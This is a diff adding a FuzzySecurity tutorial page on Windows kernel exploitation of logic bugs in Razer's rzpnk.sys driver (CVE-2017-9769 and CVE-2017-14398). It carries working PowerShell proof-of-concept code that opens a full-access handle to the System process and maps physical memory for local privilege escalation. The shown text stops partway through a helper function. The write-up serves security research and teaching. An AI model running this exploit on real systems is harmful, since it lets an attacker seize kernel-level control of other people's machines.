@@ -1,0 +1,1397 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows ExploitDev: Part 19</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li>
+			<li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Kernel Exploitation: Logic bugs in Razer rzpnk.sys</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 19: Kernel Exploitation -> Logic bugs in Razer rzpnk.sys<span class="line"></span></h2>
+        <p>Hello and welcome back to another installment of the Windows Kernel exploitation series! Today we will be looking at something a bit different. A while back <a href="https://twitter.com/zeroSteiner">@zeroSteiner</a> found two bugs in rzpnk.sys (<a href="https://warroom.securestate.com/cve-2017-9770/">CVE-2017-9770</a> & <a href="https://warroom.securestate.com/cve-2017-9769/">CVE-2017-9769</a>), a driver used by Razer Synapse. Some time later I decided to have a look at the bugs and ... I found another logic bug leading to local privilege escalation (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14398">CVE-2017-14398</a>)!<br /><br />
+
+In this post we will briefly demonstrate CVE-2017-9769 and then we will do a full exploit for the bug I found, CVE-2017-14398. Before we get started I want to give a big shout-out to <a href="https://twitter.com/aionescu">@aionescu</a>, he always tell me I don't know what I'm doing but at the same time is kind enough to set me straight! I have also been playing with Binary Ninja if anyone is curious where the screenshots come from.<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+		+ Razer Rzpnk.Sys IOCTL 0x226048 OOB Read (CVE-2017-9770) (<a href="https://twitter.com/zeroSteiner">@zeroSteiner</a>) - <a href="https://warroom.securestate.com/cve-2017-9770/">here</a><br />
+		+ Razer Rzpnk.Sys IOCTL 0x22a050 ZwOpenProcess (CVE-2017-9769) (<a href="https://twitter.com/zeroSteiner">@zeroSteiner</a>) - <a href="https://warroom.securestate.com/cve-2017-9769/">here</a><br />
+		+ MSI ntiolib.sys/winio.sys local privilege escalation (<a href="https://twitter.com/rwfpl">@rwfpl</a>) - <a href="http://blog.rewolf.pl/blog/?p=1630">here</a><br /></p><br />
+	  
+<div class="fourteen columns bottom">
+<h2 class="title">Salting The Battlefield<span class="line"></span></h2>
+<p>Before we get stuck-in I wanted to quickly show how close the vulnerable functions are on the callgraph. They are literally neighbors in the dispatch function..</p>
+
+<p>&nbsp;</p>
+<center><img src="images/Logic_1.png"></center>
+<p>&nbsp;</p>
+
+<p>Up to a point the branch leading to these calls is shared, then we can see that a value of 10 hex is subtracted from the IOCTL and if the result is zero we jump to the ZwOpenProcess call, if the remainder is 14 hex then we jump instead to the ZwMapViewOfSection call.<br /><br />
+
+Notice also that the driver will check the length of the input and output buffer and will branch into a fail condition if an insufficient amount of input paramterers are provided or if the output buffer is not large enough.</p>
+
+<h2 class="title">ZwOpenProcess POC (CVE-2017-9769)<span class="line"></span></h2>
+
+<p><span style="color: #ffffff;"><strong>CallGraph</strong></span></p>
+
+<p>&nbsp;</p>
+<center><img src="images/Logic_2.png"></center>
+<p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Get a grip, or ehurm .. a handle!</strong></span><br /><br />
+
+We won't spend too much time on this function but the vulnerability is easy enough to prove. We know the function needs two QWORD's as input parameters and from Spencer's exploit we can see he packs a pid and a null as QWORDS. We can quickly replicate that with the following POC.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class Razer
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        IntPtr OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(
+        IntPtr lpAddress,
+        uint dwSize,
+        UInt32 flAllocationType,
+        UInt32 flProtect);
+}
+"@
+
+#----------------[Get Driver Handle]
+
+$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
+[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+
+if ($hDevice -eq -1) {
+	echo "`n[!] Unable to get driver handle..`n"
+	Return
+} else {
+	echo "`n[>] Driver access OK.."
+	echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
+	echo "[+] Handle: $hDevice"
+}
+
+#----------------[Prepare buffer & Send IOCTL]
+
+# Input buffer
+$InBuffer = @(
+	[System.BitConverter]::GetBytes([Int64]0x4) + # PID 4 = System = 0x0000000000000004
+	[System.BitConverter]::GetBytes([Int64]0x0)   # 0x0000000000000000
+)
+
+# Output buffer 1kb
+$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
+
+# Ptr receiving output byte count
+$IntRet = 0
+
+#=======
+# 0x22a050 - ZwOpenProcess
+#=======
+$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22a050, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
+if (!$CallResult) {
+	echo "`n[!] DeviceIoControl failed..`n"
+	Return
+}
+
+#----------------[Read out the result buffer]
+echo "`n[>] Call result:"
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()))
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8))</pre>
+</div>
+
+<p>Running our POC give the following output.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_3.png">
+<p>&nbsp;</p>
+
+<p>If we look at the two QWORD's returned by the driver we can see the first one is the PID we passed in and the second one is a handle. When we look up the returned handle in our PowerShell process we see the following.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_4.png">
+<p>&nbsp;</p>
+
+<p>This is game over pretty much, we have a full access handle to the System pid, that means we can read from and write to any memory in that process space. The way Spencer <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/razer_zwopenprocess.rb">exploited</a> this was by (1) getting a handle to winlogon, (2) hooking user32!LockWorkStation to execute shellcode, (3) lock the user's session, (4) profit!</p>
+
+<h2 class="title">Exploiting ZwMapViewOfSection (CVE-2017-14398)<span class="line"></span></h2>
+
+<p>Time to get to the good stuff! I highly recommend that you have a look at <a href="https://twitter.com/rwfpl">@rwfpl</a>'s post on exploiting ntiolib/winio <a href="http://blog.rewolf.pl/blog/?p=1630">here</a> to get more background on this bug type.<br /><br />
+
+<span style="color: #ffffff;"><strong>CallGraph</strong></span></p>
+
+<p>&nbsp;</p>
+<center><img src="images/Logic_5.png"></center>
+<p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Function Arguments</strong></span><br /><br />
+
+Remember from the first screenshot that the function expects 30 hex size (6 QWORD's) as input and also returns 30 hex output. We can quickly create a POC to to reach the vulnerable function.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class Razer
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        IntPtr OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(
+        IntPtr lpAddress,
+        uint dwSize,
+        UInt32 flAllocationType,
+        UInt32 flProtect);
+}
+"@
+
+#----------------[Get Driver Handle]
+
+$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
+[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+
+if ($hDevice -eq -1) {
+	echo "`n[!] Unable to get driver handle..`n"
+	Return
+} else {
+	echo "`n[>] Driver access OK.."
+	echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
+	echo "[+] Handle: $hDevice"
+}
+
+#----------------[Prepare buffer & Send IOCTL]
+
+# Input buffer
+$InBuffer = @(
+	[System.BitConverter]::GetBytes([Int64]0xAAAAAA) +
+	[System.BitConverter]::GetBytes([Int64]0xBBBBBB) +
+	[System.BitConverter]::GetBytes([Int64]0xCCCCCC) +
+	[System.BitConverter]::GetBytes([Int64]0xDDDDDD) +
+	[System.BitConverter]::GetBytes([Int64]0xEEEEEE) +
+	[System.BitConverter]::GetBytes([Int64]0xFFFFFF)
+)
+
+# Output buffer
+$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
+
+# Ptr receiving output byte count
+$IntRet = 0
+
+#=======
+# 0x22A064 - ZwMapViewOfSection
+#=======
+$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
+if (!$CallResult) {
+	echo "`n[!] DeviceIoControl failed..`n"
+	Return
+}
+
+#----------------[Read out the result buffer]
+echo "`n[>] Call result:"
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64())) # 0x30 pyramid scheme ;)
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8))
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8))
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8))
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8))
+"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))</pre>
+</div>
+
+<p>Before we do any debugging, we can run our POC and see what the driver returns.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_6.png">
+<p>&nbsp;</p>
+
+<p>Cool, in addition to a bunch of our input parameters we can see an Int64 which returns 0 and and a low-order DWORD that returns an <a href="https://msdn.microsoft.com/en-us/library/cc704588.aspx">NTSTATUS code</a>. In this case <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff566481(v=vs.85).aspx">ZwMapViewOfSection</a> returns STATUS_INVALID_HANDLE which makes sense because it expects a section handle as the first parameter and we just fed it some junk. A nice side effect here is that we can tell if our call was successful by comparing the NTSTATUS code to 0x0 (STATUS_SUCCESS).<br /><br />
+
+From the graph we can already tell what some of the static parameters are but to clear all doubts we can set a breakpoint on the call to ZwMapViewOfSection and inspect the registers + stack. ZwMapViewOfSection is using the stdcall calling convention so, in order, the arguments will be stored in RCX, RDX, R8, R9 & the stack.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_7.png">
+<p>&nbsp;</p>
+
+<p>Putting this together with our input parameters we get the following.</p>
+
+<p>&nbsp;</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre>NTSTATUS ZwMapViewOfSection(
+  _In_        HANDLE          SectionHandle,      | Param 3 - RCX = SectionHandle
+  _In_        HANDLE          ProcessHandle,      | Param 1 - RDX = ProcessHandle
+  _Inout_     PVOID           *BaseAddress,       | Param 2 - R8  = BaseAddress -> Irrelevant, ptr to NULL
+  _In_        ULONG_PTR       ZeroBits,           | 0 -> OK - R9
+  _In_        SIZE_T          CommitSize,         | Param 5 - CommitSize / ViewSize
+  _Inout_opt_ PLARGE_INTEGER  SectionOffset,      | 0 -> OK
+  _Inout_     PSIZE_T         ViewSize,           | Param 5 - CommitSize / ViewSize
+  _In_        SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
+  _In_        ULONG           AllocationType,     | 0 -> Undocumented?
+  _In_        ULONG           Win32Protect        | 0x40 -> PAGE_READWRITE
+);</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+
+<p>Most of what we control here is very straight forward. For the process handle we just need to pass in a full access handle to PowerShell and commit size/view size is simply how much we are mapping into our process. The question is where are we going to get a section handle, the driver does not have any functions which allow us to call ZwCreateSection or ZwOpenSection.<br /><br />
+
+<span style="color: #ffffff;"><strong>Leaking Physical Memory</strong></span><br /><br />
+
+I was a bit worried at this point that the exploit was dead because I couldn't create a section handle. Luckily <a href="https://twitter.com/aionescu">@aionescu</a> slapped some sense into me. Using NtQuerySystemInformation with the SystemHandleInformation class we can leak all handles opened by processes on the system. These handles are per-process userland handles, however, the System process (PID=4) being a special case allows us to convert the userland handle into a kernel handle!<br /><br />
+
+Why do we care about this? Well System has a handle to "\Device\PhysicalMemory", if we can leak that handle we can get ZwMapViewOfSection to directly map physical memory into our PowerShell process!</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_8.png">
+<p>&nbsp;</p>
+
+<p>I wrote a powershell function to take care of this process. It uses static handle constants to determine the type of handles opened by the process. I recently updated this so it works from Win7 up to Win10RS2. <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-Handles.ps1">Get-Handles</a> is part of my <a href="https://github.com/FuzzySecurity/PSKernel-Primitives">PSKernel-Primitives</a> repo on GitHub, check it out if you want to pwn the kernel with PowerShell!</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_9.png">
+<p>&nbsp;</p>
+
+<p>All we need to do to get the kernel handle is add a static value to 0x204 (0xffffffff80000000 for 64-bit and 0x80000000 for 32-bit). We can do this dynamically as follows.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+$SystemProcHandles = Get-Handles -ProcID 4
+[Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$_.ObjectType -eq "Section"}).Handle)
+[Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000</pre>
+</div>
+
+<p>We can now put together a new POC and fill in all the missing bits. For testing purposes we will try to map 1mb of physical memory into PowerShell.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+function RZ-ZwMapViewOfSection {
+	Add-Type -TypeDefinition @"
+	using System;
+	using System.Diagnostics;
+	using System.Runtime.InteropServices;
+	using System.Security.Principal;
+	
+	public static class Razer
+	{
+		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		public static extern IntPtr CreateFile(
+			String lpFileName,
+			UInt32 dwDesiredAccess,
+			UInt32 dwShareMode,
+			IntPtr lpSecurityAttributes,
+			UInt32 dwCreationDisposition,
+			UInt32 dwFlagsAndAttributes,
+			IntPtr hTemplateFile);
+	
+		[DllImport("Kernel32.dll", SetLastError = true)]
+		public static extern bool DeviceIoControl(
+			IntPtr hDevice,
+			int IoControlCode,
+			byte[] InBuffer,
+			int nInBufferSize,
+			IntPtr OutBuffer,
+			int nOutBufferSize,
+			ref int pBytesReturned,
+			IntPtr Overlapped);
+	
+		[DllImport("kernel32.dll", SetLastError = true)]
+		public static extern IntPtr VirtualAlloc(
+			IntPtr lpAddress,
+			uint dwSize,
+			UInt32 flAllocationType,
+			UInt32 flProtect);
+	
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr OpenProcess(
+			UInt32 processAccess,
+			bool bInheritHandle,
+			int processId);
+	}
+"@
+
+	#----------------[Helper Funcs]
+	function Get-Handles {
+	<#
+	.SYNOPSIS
+		Use NtQuerySystemInformation::SystemHandleInformation to get a list of
+		open handles in the specified process, works on x32/x64.
+		Notes:
+	
+		* For more robust coding I would recomend using @mattifestation's
+		Get-NtSystemInformation.ps1 part of PowerShellArsenal.
+	
+	.DESCRIPTION
+		Author: Ruben Boonen (@FuzzySec)
+		License: BSD 3-Clause
+		Required Dependencies: None
+		Optional Dependencies: None
+	
+	.EXAMPLE
+		C:\PS> $SystemProcHandles = Get-Handles -ProcID 4
+		C:\PS> $Key = $SystemProcHandles |Where-Object {$_.ObjectType -eq "Key"}
+		C:\PS> $Key |ft
+	
+		ObjectType AccessMask PID Handle HandleFlags KernelPointer
+		---------- ---------- --- ------ ----------- -------------
+		Key        0x00000000   4 0x004C NONE        0xFFFFC9076FC29BC0
+		Key        0x00020000   4 0x0054 NONE        0xFFFFC9076FCDA7F0
+		Key        0x000F0000   4 0x0058 NONE        0xFFFFC9076FC39CE0
+		Key        0x00000000   4 0x0090 NONE        0xFFFFC907700A6B40
+		Key        0x00000000   4 0x0098 NONE        0xFFFFC90770029F70
+		Key        0x00020000   4 0x00A0 NONE        0xFFFFC9076FC9C1A0
+		[...Snip...]
+	#>
+	
+		[CmdletBinding()]
+		param (
+			[Parameter(Mandatory = $True)]
+			[int]$ProcID
+		)
+		
+		Add-Type -TypeDefinition @"
+		using System;
+		using System.Diagnostics;
+		using System.Runtime.InteropServices;
+		using System.Security.Principal;
+		
+		[StructLayout(LayoutKind.Sequential, Pack = 1)]
+		public struct SYSTEM_HANDLE_INFORMATION
+		{
+			public UInt32 ProcessID;
+			public Byte ObjectTypeNumber;
+			public Byte Flags;
+			public UInt16 HandleValue;
+			public IntPtr Object_Pointer;
+			public UInt32 GrantedAccess;
+		}
+		
+		public static class GetHandles
+		{
+			[DllImport("ntdll.dll")]
+			public static extern int NtQuerySystemInformation(
+				int SystemInformationClass,
+				IntPtr SystemInformation,
+				int SystemInformationLength,
+				ref int ReturnLength);
+		}
+"@
+	
+		# Make sure the PID exists
+		if (!$(get-process -Id $ProcID -ErrorAction SilentlyContinue)) {
+			Return
+		}
+	
+		# Flag switches (0 = NONE?)
+		$FlagSwitches = @{
+			0 = 'NONE'
+			1 = 'PROTECT_FROM_CLOSE'
+			2 = 'INHERIT'
+		}
+		
+		$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+		$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+		switch ($OSMajorMinor)
+		{
+			'10.0' # Windows 10 (Tested on v1511)
+			{
+				# Win 10 v1703
+				if ($OSVersion.Build -ge 15063) {
+					$TypeSwitches = @{
+						0x24 = 'TmTm'; 0x18 = 'Desktop'; 0x7 = 'Process'; 0x2c = 'RegistryTransaction'; 0xe = 'DebugObject';
+						0x3d = 'VRegConfigurationContext'; 0x34 = 'DmaDomain'; 0x1c = 'TpWorkerFactory'; 0x1d = 'Adapter';
+						0x5 = 'Token'; 0x39 = 'DxgkSharedResource'; 0xc = 'PsSiloContextPaged'; 0x38 = 'NdisCmState';
+						0xb = 'ActivityReference'; 0x35 = 'PcwObject'; 0x2f = 'WmiGuid'; 0x33 = 'DmaAdapter';
+						0x30 = 'EtwRegistration'; 0x29 = 'Session'; 0x1a = 'RawInputManager'; 0x13 = 'Timer'; 0x10 = 'Mutant';
+						0x14 = 'IRTimer'; 0x3c = 'DxgkCurrentDxgProcessObject'; 0x21 = 'IoCompletion';
+						0x3a = 'DxgkSharedSyncObject'; 0x17 = 'WindowStation'; 0x15 = 'Profile'; 0x23 = 'File';
+						0x2a = 'Partition'; 0x12 = 'Semaphore'; 0xd = 'PsSiloContextNonPaged'; 0x32 = 'EtwConsumer';
+						0x19 = 'Composition'; 0x31 = 'EtwSessionDemuxEntry'; 0x1b = 'CoreMessaging'; 0x25 = 'TmTx';
+						0x4 = 'SymbolicLink'; 0x36 = 'FilterConnectionPort'; 0x2b = 'Key'; 0x16 = 'KeyedEvent';
+						0x11 = 'Callback'; 0x22 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job';
+						0x3b = 'DxgkSharedSwapChainObject'; 0x1e = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1f = 'Device';
+						0x3 = 'Directory'; 0x28 = 'Section'; 0x27 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type';
+						0x37 = 'FilterCommunicationPort'; 0x2e = 'PowerRequest'; 0x26 = 'TmRm'; 0xf = 'Event';
+						0x2d = 'ALPC Port'; 0x20 = 'Driver';
+					}
+				}
+				
+				# Win 10 v1607
+				if ($OSVersion.Build -ge 14393 -And $OSVersion.Build -lt 15063) {
+					$TypeSwitches = @{
+						0x23 = 'TmTm'; 0x17 = 'Desktop'; 0x7 = 'Process'; 0x2b = 'RegistryTransaction'; 0xd = 'DebugObject';
+						0x3a = 'VRegConfigurationContext'; 0x32 = 'DmaDomain'; 0x1b = 'TpWorkerFactory'; 0x1c = 'Adapter';
+						0x5 = 'Token'; 0x37 = 'DxgkSharedResource'; 0xb = 'PsSiloContextPaged'; 0x36 = 'NdisCmState';
+						0x33 = 'PcwObject'; 0x2e = 'WmiGuid'; 0x31 = 'DmaAdapter'; 0x2f = 'EtwRegistration';
+						0x28 = 'Session'; 0x19 = 'RawInputManager'; 0x12 = 'Timer'; 0xf = 'Mutant'; 0x13 = 'IRTimer';
+						0x20 = 'IoCompletion'; 0x38 = 'DxgkSharedSyncObject'; 0x16 = 'WindowStation'; 0x14 = 'Profile';
+						0x22 = 'File'; 0x3b = 'VirtualKey'; 0x29 = 'Partition'; 0x11 = 'Semaphore'; 0xc = 'PsSiloContextNonPaged';
+						0x30 = 'EtwConsumer'; 0x18 = 'Composition'; 0x1a = 'CoreMessaging'; 0x24 = 'TmTx'; 0x4 = 'SymbolicLink';
+						0x34 = 'FilterConnectionPort'; 0x2a = 'Key'; 0x15 = 'KeyedEvent'; 0x10 = 'Callback';
+						0x21 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job'; 0x39 = 'DxgkSharedSwapChainObject';
+						0x1d = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1e = 'Device'; 0x3 = 'Directory'; 0x27 = 'Section';
+						0x26 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type'; 0x35 = 'FilterCommunicationPort'; 0x2d = 'PowerRequest';
+						0x25 = 'TmRm'; 0xe = 'Event'; 0x2c = 'ALPC Port'; 0x1f = 'Driver';
+					}
+				}
+				
+				# Win 10 v1511
+				if ($OSVersion.Build -lt 14393) {
+					$TypeSwitches = @{
+						0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
+						0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
+						0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'Mutant'; 0x0E = 'Callback'; 0x0F = 'Semaphore';
+						0x10 = 'Timer'; 0x11 = 'IRTimer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
+						0x15 = 'Desktop'; 0x16 = 'Composition'; 0x17 = 'RawInputManager'; 0x18 = 'TpWorkerFactory';
+						0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
+						0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
+						0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Partition'; 0x27 = 'Key';
+						0x28 = 'ALPC Port'; 0x29 = 'PowerRequest'; 0x2A = 'WmiGuid'; 0x2B = 'EtwRegistration';
+						0x2C = 'EtwConsumer'; 0x2D = 'DmaAdapter'; 0x2E = 'DmaDomain'; 0x2F = 'PcwObject';
+						0x30 = 'FilterConnectionPort'; 0x31 = 'FilterCommunicationPort'; 0x32 = 'NetworkNamespace';
+						0x33 = 'DxgkSharedResource'; 0x34 = 'DxgkSharedSyncObject'; 0x35 = 'DxgkSharedSwapChainObject';
+					}
+				}
+			}
+			
+			'6.2' # Windows 8 and Windows Server 2012
+			{
+				$TypeSwitches = @{
+					0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
+					0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
